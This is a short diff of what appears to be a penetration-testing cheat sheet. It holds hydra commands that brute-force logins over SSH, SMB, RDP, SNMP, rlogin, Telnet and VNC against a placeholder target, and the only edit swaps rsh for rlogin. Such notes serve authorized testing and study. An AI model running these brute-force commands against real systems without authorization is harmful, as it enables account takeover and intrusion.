@@ -41,7 +41,7 @@ hydra -L usernames -P passwords ssh://$TARGET -t35
 hydra -L usernames -P passwords smb://$TARGET -t35
 hydra -L usernames -P passwords rdp://$TARGET -t35
 hydra -L usernames -P passwords snmp://$TARGET -t35
-hydra -L usernames -P passwords rsh://$TARGET -t35
+hydra -L usernames -P passwords rlogin://$TARGET -t35
 hydra -L usernames -P passwords telnet://$TARGET -t35
 hydra -L usernames -P passwords vnc://$TARGET -t35
 
